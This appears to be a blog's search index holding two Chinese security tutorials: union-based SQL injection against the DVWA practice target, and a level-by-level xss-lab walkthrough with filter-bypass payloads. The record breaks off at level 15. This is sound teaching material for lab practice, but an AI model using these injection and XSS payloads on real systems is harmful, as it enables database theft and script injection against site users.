<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQL注入的入门</title>
      <link href="2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/"/>
      <url>2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="SQL注入的入门">          <a href="#SQL注入的入门" class="heading-link"><i class="fas fa-link"></i></a>SQL注入的入门</h1>      <p>参考：</p><p><span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/weixin_45798017/article/details/105306095">https://blog.csdn.net/weixin_45798017/article/details/105306095</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><a href="https://sculptor-liu.github.io/2020/07/25/SQL%20%E6%B3%A8%E5%85%A5/">https://sculptor-liu.github.io/2020/07/25/SQL%20%E6%B3%A8%E5%85%A5/</a></p>        <h2 id="1-SQL的基本命令">          <a href="#1-SQL的基本命令" class="heading-link"><i class="fas fa-link"></i></a>1.SQL的基本命令</h2>      <p><strong>首先</strong>，进入mysql命令行</p><p><strong>新版的</strong></p><p>进入mysql的bin的存放路径-&gt;cmd</p><a id="more"></a><p>命令:</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -proot            &#x2F;&#x2F;-u是账户名，-p是密码    都是root</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/0.1.png"></p><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/0.2.png"></p><p><strong>老版的：</strong></p><p>其他选项菜单-&gt;mysql工具-&gt;mysql命令行</p><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/0.3.png"></p>        <h3 id="1-1-查找数据库">          <a href="#1-1-查找数据库" class="heading-link"><i class="fas fa-link"></i></a>1.1 查找数据库</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/1.1.png"></p>        <h3 id="1-2-使用数据库">          <a href="#1-2-使用数据库" class="heading-link"><i class="fas fa-link"></i></a>1.2 使用数据库</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use dvwa;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/1.2.png"></p>        <h3 id="1-3-查找数据表">          <a href="#1-3-查找数据表" class="heading-link"><i class="fas fa-link"></i></a>1.3 查找数据表</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/1.3.png"></p>        <h3 id="1-4-查询数据结构">          <a href="#1-4-查询数据结构" class="heading-link"><i class="fas fa-link"></i></a>1.4 查询数据结构</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc users;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/1.4.png"></p>        <h3 id="1-5-创建新的数据库">          <a href="#1-5-创建新的数据库" class="heading-link"><i class="fas fa-link"></i></a>1.5 创建新的数据库</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database haoye;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/1.5.png"></p>        <h3 id="1-6-删除数据库">          <a href="#1-6-删除数据库" class="heading-link"><i class="fas fa-link"></i></a>1.6 删除数据库</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database haoye;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/1.6.png"></p>        <h2 id="2-基本函数">          <a href="#2-基本函数" class="heading-link"><i class="fas fa-link"></i></a>2.基本函数</h2>              <h3 id="2-1-版本">          <a href="#2-1-版本" class="heading-link"><i class="fas fa-link"></i></a>2.1 版本</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">version（）</span><br></pre></td></tr></table></div></figure>        <h3 id="2-2-数据库">          <a href="#2-2-数据库" class="heading-link"><i class="fas fa-link"></i></a>2.2 数据库</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">database（）</span><br></pre></td></tr></table></div></figure>        <h3 id="2-3-数据表">          <a href="#2-3-数据表" class="heading-link"><i class="fas fa-link"></i></a>2.3 数据表</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table（）</span><br></pre></td></tr></table></div></figure>        <h2 id="3-基于information-schema">          <a href="#3-基于information-schema" class="heading-link"><i class="fas fa-link"></i></a>3.基于information_schema</h2>              <h3 id="3-1-总的数据库">          <a href="#3-1-总的数据库" class="heading-link"><i class="fas fa-link"></i></a>3.1 总的数据库</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema.schemata</span><br></pre></td></tr></table></div></figure>        <h3 id="3-2-数据库的库">          <a href="#3-2-数据库的库" class="heading-link"><i class="fas fa-link"></i></a>3.2 数据库的库</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema.schema</span><br></pre></td></tr></table></div></figure>        <h3 id="3-3-数据表的库">          <a href="#3-3-数据表的库" class="heading-link"><i class="fas fa-link"></i></a>3.3 数据表的库</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema.tables</span><br></pre></td></tr></table></div></figure>        <h3 id="3-4-数据结构的库">          <a href="#3-4-数据结构的库" class="heading-link"><i class="fas fa-link"></i></a>3.4 数据结构的库</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema.columns</span><br></pre></td></tr></table></div></figure>        <h4 id="数据库">          <a href="#数据库" class="heading-link"><i class="fas fa-link"></i></a>数据库</h4>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_schema</span><br></pre></td></tr></table></div></figure>        <h4 id="数据表">          <a href="#数据表" class="heading-link"><i class="fas fa-link"></i></a>数据表</h4>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_name</span><br></pre></td></tr></table></div></figure>        <h4 id="数据结构">          <a href="#数据结构" class="heading-link"><i class="fas fa-link"></i></a>数据结构</h4>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">column_name</span><br></pre></td></tr></table></div></figure>        <h2 id="4-常用函数">          <a href="#4-常用函数" class="heading-link"><i class="fas fa-link"></i></a>4.常用函数</h2>              <h3 id="4-1-group-concat">          <a href="#4-1-group-concat" class="heading-link"><i class="fas fa-link"></i></a>4.1 group_concat()</h3>      <p>利用 group_concat()函数可以得到所有库名，或者同一库名下的所有表名，省去了一个个的麻烦</p><p>函数里面加 schema_name,table_name,column_name 就可以了</p><p>同时，利用 union select group_concat(字段名) from (库名.表名) 可以得到字段内容</p>        <h2 id="5-常用注入语句">          <a href="#5-常用注入语句" class="heading-link"><i class="fas fa-link"></i></a>5.常用注入语句</h2>              <h3 id="5-1-万能头">          <a href="#5-1-万能头" class="heading-link"><i class="fas fa-link"></i></a>5.1 万能头</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1#                #是注释符号</span><br></pre></td></tr></table></div></figure>        <h3 id="5-2-查询字段长度">          <a href="#5-2-查询字段长度" class="heading-link"><i class="fas fa-link"></i></a>5.2 查询字段长度</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 1&#x2F;2&#x2F;3...#</span><br><span class="line">当页面返回 Unknown column &#39;3&#39; in &#39;order clause&#39;的类似字样时则，3前面的2是正确字段长度</span><br></pre></td></tr></table></div></figure>        <h3 id="5-3-union-select联合查询">          <a href="#5-3-union-select联合查询" class="heading-link"><i class="fas fa-link"></i></a>5.3 union select联合查询</h3>      <p>union 操作符用于合并两个或者多个 SQL 语句集合起来，得到联合的查询结果</p>        <h2 id="6-实例">          <a href="#6-实例" class="heading-link"><i class="fas fa-link"></i></a>6.实例</h2>      <p>靶机：DVWA</p>        <h3 id="low级别">          <a href="#low级别" class="heading-link"><i class="fas fa-link"></i></a>low级别</h3>              <h4 id="6-1-1-查看字段">          <a href="#6-1-1-查看字段" class="heading-link"><i class="fas fa-link"></i></a>6.1.1 查看字段</h4>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 1&#x2F;2&#x2F;3...#</span><br></pre></td></tr></table></div></figure>        <h4 id="6-1-2-查看数据库">          <a href="#6-1-2-查看数据库" class="heading-link"><i class="fas fa-link"></i></a>6.1.2 查看数据库</h4>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,database()#           </span><br><span class="line">这个只能查询到当前数据库</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,group_concat(schema_name)from information_schema.schemata#</span><br><span class="line">查询整个服务器上所有的数据库</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/6.1.2.png"></p>        <h4 id="6-1-3-查看数据表">          <a href="#6-1-3-查看数据表" class="heading-link"><i class="fas fa-link"></i></a>6.1.3 查看数据表</h4>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&quot;dvwa&quot;#</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/6.1.3.png"></p>        <h4 id="6-1-4-查看数据结构">          <a href="#6-1-4-查看数据结构" class="heading-link"><i class="fas fa-link"></i></a>6.1.4 查看数据结构</h4>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;users&quot;#</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/6.1.4.png"></p>        <h4 id="6-1-5-查看数据结构中的内容">          <a href="#6-1-5-查看数据结构中的内容" class="heading-link"><i class="fas fa-link"></i></a>6.1.5 查看数据结构中的内容</h4>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,group_concat(user)from dvwa.users#</span><br><span class="line">dvwa.users就是数据库下的数据表</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/6.1.5.png"></p>        <h2 id="7-题目">          <a href="#7-题目" class="heading-link"><i class="fas fa-link"></i></a>7.题目</h2>      <p>BUUCTF</p><p><span class="exturl"><a class="exturl__link" href="https://buuoj.cn/">https://buuoj.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="7-1-题目一">          <a href="#7-1-题目一" class="heading-link"><i class="fas fa-link"></i></a>7.1 题目一</h3>      <p><span class="exturl"><a class="exturl__link" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL">https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="7-2-题目二">          <a href="#7-2-题目二" class="heading-link"><i class="fas fa-link"></i></a>7.2 题目二</h3>      <p><span class="exturl"><a class="exturl__link" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]LoveSQL">https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]LoveSQL</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS闯关小游戏</title>
      <link href="2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/"/>
      <url>2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="XSS闯关小游戏">          <a href="#XSS闯关小游戏" class="heading-link"><i class="fas fa-link"></i></a>XSS闯关小游戏</h1>              <h2 id="前言：">          <a href="#前言：" class="heading-link"><i class="fas fa-link"></i></a>前言：</h2>      <p>XSS的介绍：<strong><span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/weixin_45798017/article/details/105343314">https://blog.csdn.net/weixin_45798017/article/details/105343314</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></strong></p>        <h2 id="准备：">          <a href="#准备：" class="heading-link"><i class="fas fa-link"></i></a>准备：</h2>      <p>在线游戏：<strong><span class="exturl"><a class="exturl__link" href="http://test.xss.tv/">http://test.xss.tv</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></strong></p><p>自己搭建：</p><p><span class="exturl"><a class="exturl__link" href="https://m.xp.cn/">下载phpstudy</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>-&gt;<span class="exturl"><a class="exturl__link" href="https://github.com/rebo-rn/xss-lab">下载xss-lab</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>-&gt;将xss-lab放到phpstudy目录下的WWW里面</p><p>打开phpstudy的apache，浏览器访问：127.0.0.1/xss-lab</p><a id="more"></a><p><strong>注意</strong>：xss最好搭建在虚拟机中，因为搭建在本机中无法利用burpsuite抓包</p>        <h2 id="游戏：">          <a href="#游戏：" class="heading-link"><i class="fas fa-link"></i></a>游戏：</h2>              <h3 id="level-1">          <a href="#level-1" class="heading-link"><i class="fas fa-link"></i></a>level 1</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/1.1.png"></p><p>payload：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert()&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></div></figure>        <h3 id="level-2">          <a href="#level-2" class="heading-link"><i class="fas fa-link"></i></a>level 2</h3>      <p>尝试level 1的方法，不行，F12查看源代码，发现方框里的被“ ”当作字符串了</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2.1.png"></p><p>想办法把value后面的“过滤掉，或者闭合</p><p>payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert()&lt;&#x2F;script&gt;</span><br><span class="line">或者  &quot;onclick&#x3D;alert()&gt;    需要点击一下输入框。</span><br><span class="line">或者  &quot;onmouseover&#x3D;alert()&gt;需要要鼠标滑过输入框</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2.2.png"></p>        <h3 id="level-3">          <a href="#level-3" class="heading-link"><i class="fas fa-link"></i></a>level 3</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/3.1.png"></p><p>同样的直接输入payload执行语句会被当做value的字符串，用”闭合，然后无法执行</p><p>查看php中的源代码，显示value最后的是 ‘ 结尾的</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/3.2.png"></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;    &#x2F;&#x2F;可以从这个看到value值也被实体化，value的值执行了htmlspecialchars($str)函数，它的作用是把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体，所以不能使用尖括号</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/3.3.png"></p><p>但是htmlspecialchars默认配置是不过滤单引号。只有设置了：quotestyle选项为ENT_QUOTES，才可以；那么可以用单引号闭合并且不能包含&lt;&gt;则</p><p>payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;onclick&#x3D;alert()&#x2F;&#x2F;    &#x2F;&#x2F;是把后面的语句注释了</span><br><span class="line">或者 &#39;onmouseover&#x3D;alert()&#x2F;&#x2F;</span><br></pre></td></tr></table></div></figure>        <h3 id="level-4">          <a href="#level-4" class="heading-link"><i class="fas fa-link"></i></a>level 4</h3>      <p>level 4和level 3原理类似</p><p>只是value后面以双引号结束，同时发生了替换函数</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/4.1.png"></p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/4.2.png"></p><p>将输入的&lt;和&gt;替换过滤了</p><p>可以利用和level 3类似的方法</p><p>执行payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;onclick&#x3D;alert()&#x2F;&#x2F;</span><br><span class="line">或者&quot;onmouseover&#x3D;alert()&#x2F;&#x2F;</span><br></pre></td></tr></table></div></figure>        <h3 id="level-5">          <a href="#level-5" class="heading-link"><i class="fas fa-link"></i></a>level 5</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/5.1.png"></p><p>查看源码，发现执行了两个替换函数，将script和on都替换了，所以script和onclick还有onmouseover的标签都没法使用。</p><p>尝试执行a的标签</p><p>payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href&#x3D;javascript:alert()&gt;test&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/5.2.png"></p>        <h3 id="level-6">          <a href="#level-6" class="heading-link"><i class="fas fa-link"></i></a>level 6</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/6.1.png"></p><p>过滤了script，on，src，data，href，但由于是用str_replace函数来过滤的，所以可以用大小写绕过</p><p>payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a Href&#x3D;javascript:alert()&gt;test&lt;&#x2F;a&gt;</span><br><span class="line">或者&quot;&gt;&lt;Script&gt;alert()&lt;&#x2F;Script&gt;</span><br><span class="line">或者&quot;Onclick&#x3D;alert()&gt;</span><br><span class="line">或者&quot;Onmouseover&#x3D;alert()&gt;</span><br></pre></td></tr></table></div></figure>        <h3 id="level-7">          <a href="#level-7" class="heading-link"><i class="fas fa-link"></i></a>level 7</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/7.1.png"></p><p>很显然，过滤了script，on，src，data，href，尝试通过重叠拼写进行绕过注入</p><p>payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hhrefref&#x3D;javasscriptcript:alert()&gt;test&lt;&#x2F;a&gt;</span><br><span class="line">或者&quot;&gt;&lt;sscriptcript&gt;alert()&lt;&#x2F;sscriptcript&gt;</span><br><span class="line">或者&quot;oonnclick&#x3D;alert()&gt;</span><br><span class="line">或者&quot;oonnmouseover&#x3D;alert()&gt;</span><br></pre></td></tr></table></div></figure>        <h3 id="level-8">          <a href="#level-8" class="heading-link"><i class="fas fa-link"></i></a>level 8</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/8.1.png"></p><p>随便输入数值，F12查看源码，可以看出下面的href友情链接显示的为输入的值，那么直接用javascript的标签</p><p>但是，</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/8.2.png"></p><p>很显然过滤了script，on，src，data，href还有双引号，尝试利用html编码绕过</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/8.3.png"></p><p>payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascri&amp;#112;t:alert()</span><br></pre></td></tr></table></div></figure>        <h3 id="level-9">          <a href="#level-9" class="heading-link"><i class="fas fa-link"></i></a>level 9</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/9.1.png"></p><p>很显然过滤了script，on，src，data，href还有双引号，同时对value的值进行了htmlspecialchars($str)函数的转换，上题相似</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/9.2.png"></p><p>同时，多了一个url检测，如果发现没有带http:// 内容则会显示不合法， 那么怎么可以既有它，又不让它执行呢?只需填加个注释，（可选择多行注释和单行注释）包含http://就行了</p><p>payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascri&amp;#112;t:alert()&#x2F;&#x2F;http:&#x2F;&#x2F;</span><br></pre></td></tr></table></div></figure>        <h3 id="level-10">          <a href="#level-10" class="heading-link"><i class="fas fa-link"></i></a>level 10</h3>      <p>F12查看网页源代码，同时查看php中的源代码</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/10.1.png"></p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/10.2.png"></p><p>可以看出有三个参数的属性是hidden，同时t_sort是传参的</p><p>所以构建payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?t_sort&#x3D;&quot; onclick&#x3D;alert() type&#x3D;&quot;button&quot;</span><br><span class="line">或者 ?t_sort&#x3D;&quot; onclick&#x3D;alert() type&#x3D;&quot;text&quot;</span><br><span class="line">或者直接在上面的url栏的最后添加&amp;t_sort&#x3D;&quot; onclick&#x3D;alert() type&#x3D;&quot;text&quot;（或者button属性的）</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/10.3.png"></p>        <h3 id="level-11">          <a href="#level-11" class="heading-link"><i class="fas fa-link"></i></a>level 11</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/11.1.png"></p><p>分析源码可得知t_ref字段是http referer的值，根据http_referer 参数想到了HTTP头，那么我们可以在请求头进行XSS注入，这一关很显然注入点在Referer所以可以利用burpsuite抓包修改Referer的值(hackbar没有成功)</p><p>修改前：</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/11.2.png"></p><p>修改后：</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/11.3.png"></p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/11.4.png"></p>        <h3 id="level-12">          <a href="#level-12" class="heading-link"><i class="fas fa-link"></i></a>level 12</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/12.1.png"></p><p>根据HTTP_USER_AGENT参数还是想到了HTTP请求头中的user-agent，那么，同理可以按照第十一关的方法来做:</p><p>这里直接利用hackbar就成功了</p><p>payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick&#x3D;alert() type&#x3D;&quot;button&quot;</span><br><span class="line">或者 &quot; onclick&#x3D;alert() type&#x3D;&quot;text&quot;</span><br><span class="line">onclick换成onmouseover都可以</span><br></pre></td></tr></table></div></figure><p>或者burpsuite抓包修改</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/12.2.png"></p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/12.3.png"></p>        <h3 id="level-13">          <a href="#level-13" class="heading-link"><i class="fas fa-link"></i></a>level 13</h3>      <p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/13.1.png"></p><p>和上面的方法类似，只不过这里变成了cookie了，hackbar没法用，所以用burpsuite</p><p>payload和上面的一样</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/13.2.png"></p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/13.3.png"></p>        <h3 id="level-14">          <a href="#level-14" class="heading-link"><i class="fas fa-link"></i></a>level 14</h3>      <p>由于exifviewer现在不支持上传了，这个漏洞是以前该网站存在的一个漏洞，现在也已经无法复现了</p>        <h3 id="level-15">          <a href="#level-15" class="heading-link"><i class="fas fa-link"></i></a>level 15</h3>      <p>查看源码</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/15.1.png"></p><p>注意到了ng-include，ng-include相当于php的include函数，然后src参数被转义了，最终我们<br>可以include leve1然后再用img标签传xss</p><p><img src="/2020/10/24/xss%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/15.2.png"></p><p>payload</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url栏最后添加</span><br><span 